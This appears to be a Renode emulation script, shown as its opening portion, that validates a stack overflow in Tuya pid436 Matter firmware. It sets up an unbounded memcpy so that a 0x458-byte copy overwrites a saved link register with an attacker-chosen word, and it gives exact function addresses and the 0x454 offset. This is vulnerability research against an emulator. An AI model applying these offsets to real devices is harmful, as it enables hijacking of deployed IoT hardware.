:name: MT-02 Tuya pid436 Matter sub_80B64A8 unbounded memcpy -> saved-LR -- validation
:description: Drives the unbounded byte-wise memcpy sink sub_80B64A8 (memcpy(r0=dest,r1=src,r2=len), forward ascending, NO length bound) of the real Tuya pid436 Matter firmware on the emulated EFR32MG24. Mirrors the real vuln in caller sub_8050018 where an in-frame buffer at SP+0x28 sits 0x454 bytes below the saved LR at SP+0x47C. A synthetic caller frame reproduces that 0x454 distance: dest buffer @0x2000E000, sentinel saved-LR @dest+0x454, copy of len 0x458 crosses the sentinel and overwrites it with the attacker word 0x20006E01.
#
# Sink sub_80B64A8 @0x80B64A8: memcpy(dest=r0, src=r1, len=r2), forward byte-wise,
#   dest ascending, NO bound -> writes dest[0..len-1]. push {r4,lr}; pop {r4,pc}.
# Real caller sub_8050018: in-frame buffer SP+0x28, saved LR SP+0x47C, distance 0x454.
# Synthetic frame: dest=0x2000E000, saved-LR sentinel @dest+0x454=0x2000E454=0xCAFED00D,
#   src=0x2000F000, attacker word @src+0x454=0x2000F454=0x20006E01, len=0x458 (>0x454).
#
$bin=@scripts/silabs-vuln/mt02_tuya.elf
include @scripts/silabs-vuln/boot_mg24.resc

emulation RunFor "0.4"
pause

# --- SRC buffer @0x2000F000: fill 0x2000F000..0x2000F450 (277 dwords) with 0xCCCCCCCC filler,
#     then the attacker word 0x20006E01 at src+0x454 = 0x2000F454 (this dword lands on dest+0x454).
sysbus WriteDoubleWord 0x2000F000 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F004 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F008 0xCCCCCCCC
sysbus WriteDoubleWord 0x2000F00C 0xCCCCCCCC
